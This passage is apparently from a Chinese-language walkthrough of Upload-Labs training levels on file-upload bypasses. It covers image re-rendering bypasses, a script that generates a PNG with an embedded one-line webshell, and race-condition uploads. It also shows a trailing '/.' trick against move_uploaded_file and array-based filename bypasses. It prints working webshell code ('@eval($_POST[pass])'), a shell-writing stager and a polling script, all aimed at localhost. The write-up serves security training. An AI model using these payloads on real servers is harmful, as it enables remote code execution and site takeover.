<span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传失败！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;png&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/png&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = imagecreatefrompng(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                 <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                srand(time());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = strval(rand()).<span class=\"string\">&quot;.png&quot;</span>;</span><br><span class=\"line\">                <span class=\"variable\">$newimagepath</span> = <span class=\"variable\">$UPLOAD_ADDR</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                imagepng(<span class=\"variable\">$im</span>,<span class=\"variable\">$newimagepath</span>);</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;               </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传失败！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;gif&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/gif&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = imagecreatefromgif(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                srand(time());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = strval(rand()).<span class=\"string\">&quot;.gif&quot;</span>;</span><br><span class=\"line\">                <span class=\"variable\">$newimagepath</span> = <span class=\"variable\">$UPLOAD_ADDR</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                imagegif(<span class=\"variable\">$im</span>,<span class=\"variable\">$newimagepath</span>);</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传失败！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class=\"line\">    &#125;php</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>图片二次渲染会将上传的文件的图片部分抠出然后在服务器生成一个新图片，有点复杂</p>\n<p>看了看网上的思路：上传纯 gif 成功 - 下载服务区端生成的新 gif 对比 16 进制，将一句话插入到没有改变的地方，gif 上传简单，png 和 jpg 的复杂一点，<br>\n这是上传的纯 gif 的 16 进制：<br>\n<a href=\"https://images.cnblogs.com/cnblogs_com/threesoil/1664657/o_200315112113pass161.png\"><img src=\"Upload-Labs/o_200315112113pass161.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/o_200315112113pass161.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"></a><br>\n 这是服务器二次渲染之后的 gif 的 16 进制：<a href=\"https://images.cnblogs.com/cnblogs_com/threesoil/1664657/o_200315112120pass162.png\"><img src=\"Upload-Labs/o_200315112120pass162.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/o_200315112120pass162.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"></a></p>\n<p>可以看到从差不多第二行开始到倒数第二行没有变化 ，所以我将一句话插到图片中下面一堆点的前面：</p>\n<p><a href=\"https://images.cnblogs.com/cnblogs_com/threesoil/1664657/o_200315112127pass163.png\"><img src=\"Upload-Labs/o_200315112127pass163.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/o_200315112127pass163.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"></a></p>\n<p>直接上传然后文件包含 http://127.0.0.1/include.php?file=upload/9015.gif 可以 post 一个 phpinfo (); 查看以下效果</p>\n<p>蚁剑也可成功连接<br>\n /<strong> 方法二 php 脚本制作符合要求的 png 文件上传，再文件包含</strong><br>\n pass16 脚本：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//png.php</span></span><br><span class=\"line\"><span class=\"variable\">$p</span> = <span class=\"keyword\">array</span>(<span class=\"number\">0xa3</span>, <span class=\"number\">0x9f</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0xf7</span>, <span class=\"number\">0xe</span>, <span class=\"number\">0x93</span>, <span class=\"number\">0x1b</span>, <span class=\"number\">0x23</span>, <span class=\"number\">0xbe</span>, <span class=\"number\">0x2c</span>, <span class=\"number\">0x8a</span>, <span class=\"number\">0xd0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0xf9</span>, <span class=\"number\">0xe1</span>, <span class=\"number\">0xae</span>, <span class=\"number\">0x22</span>, <span class=\"number\">0xf6</span>, <span class=\"number\">0xd9</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0x5d</span>, <span class=\"number\">0xfb</span>, <span class=\"number\">0xae</span>, <span class=\"number\">0xcc</span>, <span class=\"number\">0x5a</span>, <span class=\"number\">0x1</span>, <span class=\"number\">0xdc</span>, <span class=\"number\">0x5a</span>, <span class=\"number\">0x1</span>, <span class=\"number\">0xdc</span>, <span class=\"number\">0xa3</span>, <span class=\"number\">0x9f</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0xa5</span>, <span class=\"number\">0xbe</span>, <span class=\"number\">0x5f</span>, <span class=\"number\">0x76</span>, <span class=\"number\">0x74</span>, <span class=\"number\">0x5a</span>, <span class=\"number\">0x4c</span>, <span class=\"number\">0xa1</span>, <span class=\"number\">0x3f</span>, <span class=\"number\">0x7a</span>, <span class=\"number\">0xbf</span>, <span class=\"number\">0x30</span>, <span class=\"number\">0x6b</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0x2d</span>, <span class=\"number\">0x60</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x7d</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x9d</span>, <span class=\"number\">0xad</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0xa1</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0x33</span>);</span><br><span class=\"line\"><span class=\"variable\">$img</span> = imagecreatetruecolor(<span class=\"number\">32</span>, <span class=\"number\">32</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$y</span> = <span class=\"number\">0</span>; <span class=\"variable\">$y</span> &lt; sizeof(<span class=\"variable\">$p</span>); <span class=\"variable\">$y</span> += <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">   <span class=\"variable\">$r</span> = <span class=\"variable\">$p</span>[<span class=\"variable\">$y</span>];</span><br><span class=\"line\">   <span class=\"variable\">$g</span> = <span class=\"variable\">$p</span>[<span class=\"variable\">$y</span>+<span class=\"number\">1</span>];</span><br><span class=\"line\">   <span class=\"variable\">$b</span> = <span class=\"variable\">$p</span>[<span class=\"variable\">$y</span>+<span class=\"number\">2</span>];</span><br><span class=\"line\">   <span class=\"variable\">$color</span> = imagecolorallocate(<span class=\"variable\">$img</span>, <span class=\"variable\">$r</span>, <span class=\"variable\">$g</span>, <span class=\"variable\">$b</span>);</span><br><span class=\"line\">   imagesetpixel(<span class=\"variable\">$img</span>, round(<span class=\"variable\">$y</span> / <span class=\"number\">3</span>), <span class=\"number\">0</span>, <span class=\"variable\">$color</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">imagepng(<span class=\"variable\">$img</span>,<span class=\"string\">&#x27;./pass16.png&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>php 脚本执行可生成一个符合规则的插入一句话木马的 pass16.png 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php pass16.php 一个纯净的png文件</span><br></pre></td></tr></table></figure>\n<h2 id=\"pass17条件竞争\"><a class=\"markdownIt-Anchor\" href=\"#pass17条件竞争\">#</a> pass17 条件竞争</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$file_name</span>,strrpos(<span class=\"variable\">$file_name</span>,<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$upload_file</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">             <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span>. rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">             rename(<span class=\"variable\">$upload_file</span>, <span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">             <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">            unlink(<span class=\"variable\">$upload_file</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>经典的条件竞争 先移动，不符合规则就改名字</p>\n<p>我们多线程让他处于移动状态，然后一直访问，总会有一次访问到，一旦访问到就会在服务器端写一个入 shell</p>\n<p>上传的 php 写马脚本：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?PHP</span> <span class=\"keyword\">echo</span> md5(<span class=\"number\">1</span>);fputs(fopen(<span class=\"string\">&#x27;shell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;</span>);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上传时用 burp 抓包发送到 intruder 中，设置 paload 为 Null payloads ，设置不断发包，</p>\n<p>写一个 python 脚本不断访问上传的 php, 在访问到时返回 OK：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    i=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(i,end = <span class=\"string\">&#x27;\\r&#x27;</span>)</span><br><span class=\"line\">            a = requests.get(<span class=\"string\">&quot;http://127.0.0.1/upload/pass17.php&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class=\"keyword\">in</span> a.text: <span class=\"comment\">##匹配写马脚本中的md5(1)</span></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;OK&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        i+=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>同时启动 burp 发包和 python 脚本看到脚本返回 ok 时浏览器访问 upload/shell.php 蚁剑连接</p>\n<h2 id=\"条件竞争2检测后缀名\"><a class=\"markdownIt-Anchor\" href=\"#条件竞争2检测后缀名\">#</a> 条件竞争 2（检测后缀名）</h2>\n<p>还和第一个条件竞争一样，一开始就检测后缀所以得用 pass18.php.jpg 图片马抓包 burp 无限发包，<br>\n写脚本一直文件包含访问或者浏览器一直 F5，访问到 http://localhost/include.php?file=upload/pass18.php.jpg<br>\n，蚁剑连接 ok</p>\n<h2 id=\"move_uploaded_file绕过\"><a class=\"markdownIt-Anchor\" href=\"#move_uploaded_file绕过\">#</a> move_uploaded_file () 绕过</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;pht&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = pathinfo(<span class=\"variable\">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123; </span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>后缀名限制的死死的，但看到 move_uploaded_file ()，查了查，这个函数会忽略掉文件末尾的 /.<br>\n 文件名可控，我们将上传的一句话的保存名称改为 upload-19.php/. 直接上传成功可以访问，而且是任意 php 文件都可以，不用上传图片马，我们直接上传 php 马<br>\n蚁剑连接 ok</p>\n<h2 id=\"数组绕过\"><a class=\"markdownIt-Anchor\" href=\"#数组绕过\">#</a> 数组绕过</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//检查MIME</span></span><br><span class=\"line\">    <span class=\"variable\">$allow_type</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;image/jpeg&#x27;</span>,<span class=\"string\">&#x27;image/png&#x27;</span>,<span class=\"string\">&#x27;image/gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>],<span class=\"variable\">$allow_type</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//检查文件名</span></span><br><span class=\"line\">        <span class=\"variable\">$file</span> = <span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>]) ? <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>] : <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array(<span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$file</span> = explode(<span class=\"string\">&#x27;.&#x27;</span>, strtolower(<span class=\"variable\">$file</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = end(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">        <span class=\"variable\">$allow_suffix</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$ext</span>, <span class=\"variable\">$allow_suffix</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$file_name</span> = reset(<span class=\"variable\">$file</span>) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$file</span>[count(<span class=\"variable\">$file</span>) - <span class=\"number\">1</span>];</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传成功！&quot;</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传失败！&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>检查 MIME 类型和文件名，然后看 wp 发现<span class=\"katex\"><span class=\"katex-mathml\"><math 